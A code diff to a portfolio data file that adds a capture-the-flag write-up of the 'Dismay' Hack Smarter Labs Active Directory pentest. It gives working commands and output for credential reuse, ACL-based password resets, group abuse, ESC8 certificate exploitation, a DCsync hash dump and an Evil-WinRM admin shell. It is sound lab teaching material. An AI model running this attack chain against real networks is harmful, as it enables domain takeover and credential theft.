@@ -326,7 +326,8 @@ Evil-WinRM shell v3.9
 `
   },
 
-  { 
+
+{
   id: "Dismay-hsm",
   title: "Dismay (Hack Smarter Labs)",
   ctf: "Hack Smarter labs",
@@ -334,11 +335,11 @@ Evil-WinRM shell v3.9
   diff: "Hard",
   pts: 0,
   date: "2026-04-27",
-  summary: "An assumed-breach Active Directory pentest on Hack Smarter Labs.",
+  summary: "An assumed-breach, multi-machine Active Directory penetration test involving Nexus, DC1 and DC2, culminating in full domain compromise.",
 
   body: `![Dismay preview](assets/writeups/Dismay/dismay.png)
-  
-  ## Scope/Objective
+
+## Scope/Objective
 
 You have been assigned a penetration test of a client’s internal network. There are three different servers in-scope. Your task is to identify all vulnerabilities and demonstrate impact to the client by elevating your access to Domain Admin. The client has provided you VPN access and Active Directory credentials (below) for the engagement.
 
@@ -356,84 +357,45 @@ Target IP: \`10.1.107.228\`
 ## NMAP
 
 \`\`\`text
-80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: IIS Windows Server
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
 
-135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+Target_Name: EC2AMAZ-GQCP864
+NetBIOS_Domain_Name: EC2AMAZ-GQCP864
+NetBIOS_Computer_Name: EC2AMAZ-GQCP864
+DNS_Domain_Name: EC2AMAZ-GQCP864
+DNS_Computer_Name: EC2AMAZ-GQCP864
+Product_Version: 10.0.20348
 
-139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
-
-445/tcp  open  microsoft-ds? syn-ack ttl 126
-
-3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
-
-| rdp-ntlm-info: 
-|   Target_Name: EC2AMAZ-GQCP864
-|   NetBIOS_Domain_Name: EC2AMAZ-GQCP864
-|   NetBIOS_Computer_Name: EC2AMAZ-GQCP864
-|   DNS_Domain_Name: EC2AMAZ-GQCP864
-|   DNS_Computer_Name: EC2AMAZ-GQCP864
-|   Product_Version: 10.0.20348
-|_  System_Time: 2026-04-27T05:58:11+00:00
-| ssl-cert: Subject: commonName=EC2AMAZ-GQCP864
-| Issuer: commonName=EC2AMAZ-GQCP864
-
-|_ssl-date: 2026-04-27T05:58:51+00:00; 0s from scanner time.
-5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-
-Uptime guess: 0.007 days (since Mon Apr 27 05:49:05 2026)
-Network Distance: 3 hops
-TCP Sequence Prediction: Difficulty=262 (Good luck!)
-IP ID Sequence Generation: Incremental
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_  Message signing enabled but not required
-| p2p-conficker: 
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 32054/tcp): CLEAN (Timeout)
-|   Check 2 (port 39521/tcp): CLEAN (Timeout)
-|   Check 3 (port 51370/udp): CLEAN (Timeout)
-|   Check 4 (port 17234/udp): CLEAN (Timeout)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb2-time: 
-|   date: 2026-04-27T05:58:14
-|_  start_date: N/A
-|_clock-skew: mean: 0s, deviation: 0s, median: 0s
-
-TRACEROUTE (using port 135/tcp)
-HOP RTT       ADDRESS
-1   116.24 ms 10.200.0.1
-2   ...
-3   117.83 ms 10.1.107.228
+SMB signing enabled but not required.
 \`\`\`
 
-### **NetExec SMB Enumeration**
+Nexus isn't a domain-joined computer but just a Windows workstation.
+
+### NetExec SMB Enumeration
 
 \`\`\`text
-# nxc smb 10.1.107.228 -u xiao.ge -p 'AmBZATVjnH4qo8H4' --shares
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\\xiao.ge:AmBZATVjnH4qo8H4 
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [*] Enumerated shares
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  Share           Permissions     Remark
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  -----           -----------     ------
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  ADMIN$                          Remote Admin
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  C$                              Default share
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  IPC$            READ            Remote IPC
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  UpdateServicesPackages READ    A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
-SMB         10.1.107.228    445    EC2AMAZ-GQCP864  WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
+nxc smb 10.1.107.228 -u xiao.ge -p 'AmBZATVjnH4qo8H4' --shares
+
+SMB  10.1.107.228  445  EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64
+SMB  10.1.107.228  445  EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\\xiao.ge:AmBZATVjnH4qo8H4
+
+Share                    Permissions
+-----                    -----------
+ADMIN$                   Remote Admin
+C$                       Default share
+IPC$                     READ
+UpdateServicesPackages   READ
+WsusContent              READ
+WSUSTemp
 \`\`\`
 
 ## Interesting shares
+
 \`\`\`text
 WSUSTemp
 WsusContent
@@ -448,9 +410,448 @@ UpdateServicesPackages
 PS> These files were originally in the Recycle bin but i restored them
 \`\`\`
 
+## Meeting_Notes_Archive
 
+![Meeting Notes Archive](assets/writeups/Dismay/meeting_notes_archive.png)
+
+## Invoice_Drafts
+
+![Invoice Drafts](assets/writeups/Dismay/invoice_draft.png)
+
+## Temporary Credentials
+
+\`\`\`text
+staging_admin : Spring_2026_Temp!
+\`\`\`
+
+## System_Audit_Log
+
+![System Audit Log](assets/writeups/Dismay/system_audit_log.png)
+
+## Confidential.7z
+
+![Confidential 7z](assets/writeups/Dismay/confidential_7z.png)
+
+\`\`\`text
+This was password protected but the temporary creds worked here
+\`\`\`
+
+![Guy Rooki Password](assets/writeups/Dismay/guy_rooki_pass.png)
+
+## Hardcoded credentials for guy.rookie found
+
+\`\`\`text
+guy.rookie : O0Aco9FQJQ
+\`\`\`
+
+## Foothold as guy.rookie
+
+With the recovered credentials, I moved on to verifying whether the account could authenticate against the domain controllers.
+
+### NetExec Verification
+
+\`\`\`text
+nxc smb ip.txt -u guy.rookie -p 'O0Aco9FQJQ'
+
+SMB  10.1.44.140   445  DC1  [*] Windows Server 2022 Build 20348 x64
+SMB  10.1.251.13   445  DC2  [*] Windows Server 2022 Build 20348 x64
+SMB  10.1.107.228  445  EC2AMAZ-GQCP864
+
+SMB  10.1.44.140   445  DC1  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ
+SMB  10.1.251.13  445  DC2  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ
+SMB  10.1.107.228 445  EC2AMAZ-GQCP864 [-] STATUS_LOGON_FAILURE
+\`\`\`
+
+## Successful host authentication
+
+\`\`\`text
+DC1.dismay.hsm : 10.1.44.140
+DC2.dismay.hsm : 10.1.251.13
+\`\`\`
+
+## NetExec SMB Shares enumeration on DC1 & DC2
+
+### NMAP for DC1.DISMAY.HSM
+
+\`\`\`text
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  ssl/ldap
+3268/tcp open  ldap
+3269/tcp open  ssl/ldap
+3389/tcp open  ms-wbt-server
+5985/tcp open  http
+
+Target_Name: DISMAY
+NetBIOS_Domain_Name: DISMAY
+NetBIOS_Computer_Name: DC1
+DNS_Domain_Name: dismay.hsm
+DNS_Computer_Name: DC1.dismay.hsm
+Product_Version: 10.0.20348
+
+SMB signing enabled and required.
+\`\`\`
+
+### NMAP for DC2.DISMAY.HSM
+
+\`\`\`text
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  ssl/ldap
+3268/tcp open  ldap
+3269/tcp open  ssl/ldap
+3389/tcp open  ms-wbt-server
+5985/tcp open  http
+
+Target_Name: DISMAY
+NetBIOS_Domain_Name: DISMAY
+NetBIOS_Computer_Name: DC2
+DNS_Domain_Name: dismay.hsm
+DNS_Computer_Name: DC2.dismay.hsm
+Product_Version: 10.0.20348
+
+SMB signing enabled and required.
+\`\`\`
+
+### NetExec SMB Shares
+
+\`\`\`text
+nxc smb ip.txt -u guy.rookie -p 'O0Aco9FQJQ' --shares
+
+DC2:
+ADMIN$
+C$
+CertEnroll       READ
+IPC$             READ
+NETLOGON         READ
+SYSVOL           READ
+
+DC1:
+ADMIN$
+C$
+IPC$              READ
+NETLOGON          READ
+SYSVOL            READ
+Tools
+\`\`\`
+
+## NetExec User Enumeration
+
+\`\`\`text
+nxc smb DC1.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' --users-export DC1_users.txt
+
+SMB  10.1.44.140  445  DC1  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ
+
+-Username-        -Last PW Set-       -BadPW- -Description-
+Administrator     2026-02-05 09:16:49  0       Built-in account
+Guest             <never>             0       Built-in guest account
+krbtgt            2025-12-12 11:50:45  0       Key Distribution Center Service Account
+mike.silver       2026-02-08 10:39:00  0
+wang.kali         2026-02-08 10:40:19  0
+nadia.robin       2026-02-08 10:39:15  0
+jena.yamazaki     2026-02-08 10:39:30  0
+guy.rookie        2026-02-08 10:39:43  0
+
+[*] Enumerated 8 local users: DISMAY
+[*] Writing 8 local users to DC1_users.txt
+\`\`\`
+
+## Discovered Users
+
+\`\`\`text
+Administrator
+Guest
+krbtgt
+mike.silver
+wang.kali
+nadia.robin
+jena.yamazaki
+guy.rookie
+\`\`\`
+
+## LOOT collection
+
+I used RustHound-CE to collect Active Directory information for BloodHound analysis.
+
+\`\`\`text
+rusthound-ce -d dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' -i 10.1.44.140 -f DC1.dismay.hsm -c All
+
+[INFO] Connected to DISMAY.HSM Active Directory!
+[INFO] Starting data collection...
+[INFO] All data collected for NamingContext DC=dismay,DC=hsm
+[INFO] All data collected for NamingContext CN=Configuration,DC=dismay,DC=hsm
+[INFO] All data collected for NamingContext CN=Schema,CN=Configuration,DC=dismay,DC=hsm
+[INFO] All data collected for NamingContext DC=DomainDnsZones,DC=dismay,DC=hsm
+[INFO] All data collected for NamingContext DC=ForestDnsZones,DC=dismay,DC=hsm
+
+[INFO] MachineAccountQuota: 10
+[INFO] Found 11 enabled certificate templates
+
+9 users parsed!
+67 groups parsed!
+2 computers parsed!
+1 ous parsed!
+1 domains parsed!
+3 gpos parsed!
+74 containers parsed!
+1 ntauthstores parsed!
+1 aiacas parsed!
+1 rootcas parsed!
+1 enterprisecas parsed!
+33 certtemplates parsed!
+3 issuancepolicies parsed!
+
+RustHound-CE Enumeration Completed!
+\`\`\`
+
+## BloodHound Analysis
+
+![BloodHound Analysis - Initial graph](assets/writeups/Dismay/BH(1).png)
+
+Changing password for \`JENA.YAMAZAKI\`.
+
+\`\`\`text
+bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "guy.rookie" -p "O0Aco9FQJQ" set password 'jena.yamazaki' 'ghost_sec009'
+
+[+] Password changed successfully!
+\`\`\`
+
+## Verification using NXC
+
+\`\`\`text
+nxc smb 10.1.44.140 -u jena.yamazaki -p ghost_sec009
+
+SMB  10.1.44.140  445  DC1  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
+\`\`\`
+
+Changing password for \`Mike.Silver\`.
+
+\`\`\`text
+bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "jena.yamazaki" -p "ghost_sec009" set password 'mike.silver' 'HackSmarter123'
+
+[+] Password changed successfully!
+\`\`\`
+
+### RDP Authentication allowed for jena.yamazaki
+
+\`\`\`text
+nxc rdp ip.txt -u jena.yamazaki -p ghost_sec009
+
+DC1  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
+DC2  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
+\`\`\`
+
+\`\`\`text
+nxc rdp ip.txt -u mike.silver -p HackSmarter123
+
+DC2  [+] dismay.hsm\\mike.silver:HackSmarter123
+DC1  [+] dismay.hsm\\mike.silver:HackSmarter123
+\`\`\`
+
+## Mike.silver has the AddMember ACL set.
+
+![BloodHound - Mike.silver AddMember ACL](assets/writeups/Dismay/BH(2).png)
+
+\`\`\`text
+bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "mike.silver" -p "HackSmarter123" add groupMember 'SHARES_OPERATORS' 'mike.silver'
+
+[+] mike.silver added to SHARES_OPERATORS
+\`\`\`
+
+Now we have \`READ & WRITE\` access to the \`TOOLS\` share in DC1.
+
+### NetExec SMB Share enumeration
+
+\`\`\`text
+nxc smb ip.txt -u mike.silver -p HackSmarter123 --shares
+
+DC1:
+ADMIN$
+C$
+IPC$             READ
+NETLOGON         READ
+SYSVOL           READ
+Tools            READ,WRITE
+\`\`\`
+
+### NetExec SMB Share Tools enumeration
+
+\`\`\`text
+smbclient //10.1.44.140/Tools/ -U mike.silver
+
+Password for [WORKGROUP\\mike.silver]:
+
+smb: \\> ls
+
+Dism.exe
+mspaint.exe
+note.txt
+notepad.exe
+osk.exe
+\`\`\`
+
+## Note.txt
+
+\`\`\`text
+From: Adrian Thompson <adrian.thompson@dismay.hsm>
+To: Kali Wang <wang.kali@dismay.hsm>
+Subject: FINAL WARNING - Fix that broken executable NOW
+
+Kali,
+
+This is the third time this month. The binary you deployed last Thursday is completely broken. Users are screaming, auditors are asking questions, and I'm the one getting heat from upstairs. HR is already on standby. I've had it with your "it works on my machine" excuses.
+
+You have until 17:00 tomorrow to deliver a working file or you're done.
+
+Get it fixed, push the new file. No more chances.
+
+I'm not bluffing.
+
+- Adrian
+IT Security Administrator
+DISMAY Ltd.
+\`\`\`
+
+## ADCS Vulnerability ESC8 — Abusing ADCS via NTLM relaying
+
+I enumerated the certificate authority and certificate templates using Certipy.
+
+\`\`\`text
+certipy-ad find -u 'mike.silver@dismay.hsm' -p 'HackSmarter123' -dc-ip 10.1.251.13 -stdout
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+
+CA Name: dismay-DC2-CA
+DNS Name: DC2.dismay.hsm
+
+Web Enrollment:
+  HTTP Enabled: True
+  HTTPS Enabled: False
+
+User Specified SAN: Disabled
+Request Disposition: Issue
+Enforce Encryption for Requests: Enabled
+
+Enrollment:
+  DISMAY.HSM\\Authenticated Users
+
+[!] Vulnerabilities
+  ESC8: Web Enrollment is enabled over HTTP.
+\`\`\`
+
+### Checking the Certificate Web Enrollment endpoint
+
+\`\`\`text
+curl -s -I http://10.1.251.13/certsrv/certfnsh.asp
+
+HTTP/1.1 401 Unauthorized
+Content-Length: 1293
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate
+WWW-Authenticate: NTLM
+\`\`\`
+
+### Hash for DC1
+
+\`\`\`text
+certipy-ad auth -pfx DC1.pfx -dc-ip 10.1.251.13
+
+Certipy v5.0.4
+
+[*] Certificate identities:
+[*] SAN DNS Host Name: 'DC1.dismay.hsm'
+[*] SAN DNS Host Name: 'dismay.hsm'
+[*] SAN DNS Host Name: 'DISMAY'
+[*] Security Extension SID: 'S-1-5-21-1359501962-4064634841-3558559731-1000'
+
+[*] Found multiple identities in certificate
+
+[0] DNS Host Name: 'DC1.dismay.hsm' (DC1$@dismay.hsm)
+[1] DNS Host Name: 'dismay.hsm' (dismay$@hsm)
+[2] DNS Host Name: 'DISMAY' (DISMAY@unknown)
+
+> 0
+
+[*] Using principal: 'dc1$@dismay.hsm'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc1.ccache'
+[*] Wrote credential cache to 'dc1.ccache'
+[*] Trying to retrieve NT hash for 'dc1$'
+
+[*] Got hash for 'dc1$@dismay.hsm':
+aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0
+\`\`\`
+
+## DCsync Attack
+
+### DCsync Successfull
+
+\`\`\`text
+impacket-secretsdump dismay.hsm/'dc1$'@dismay.hsm -hashes 'aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0'
+
+Impacket v0.14.0.dev0
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:746e5739a93cf20f26f6952227a3c321:::
+
+dismay.hsm\\mike.silver:1108:aad3b435b51404eeaad3b435b51404ee:a908eaeebad5fc442b6c699cdc1fec88:::
+dismay.hsm\\wang.kali:1109:aad3b435b51404eeaad3b435b51404ee:3c96bcb2622d45fc301fd72ba3004dd9:::
+dismay.hsm\\nadia.robin:1110:aad3b435b51404eeaad3b435b51404ee:bd0ff5e06c9ccec992bb8f96d986effb:::
+dismay.hsm\\jena.yamazaki:1111:aad3b435b51404eeaad3b435b51404ee:84be2919ce5f1544b04d61146f07acaa:::
+dismay.hsm\\guy.rookie:1112:aad3b435b51404eeaad3b435b51404ee:bfbb44b71a8f029be27d12097fe84d0b:::
+
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0:::
+DC2$:1114:aad3b435b51404eeaad3b435b51404ee:3b4b4a869f93f6e67ae0450bdd1c73e1:::
+
+[*] Kerberos keys grabbed
+[*] Cleaning up...
+\`\`\`
+
+## Administrator Hash
+
+\`\`\`text
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0
+\`\`\`
+
+## Full Domain Compromise 👑
+
+\`\`\`text
+*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami
+
+dismay\\administrator
+
+*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
+\`\`\`
+
+![Dismay Certificate of Completion](assets/writeups/Dismay/cert.png)
 `
-  }
+}
+
 ];
 
 /* ---------- CERTIFICATIONS ---------- */
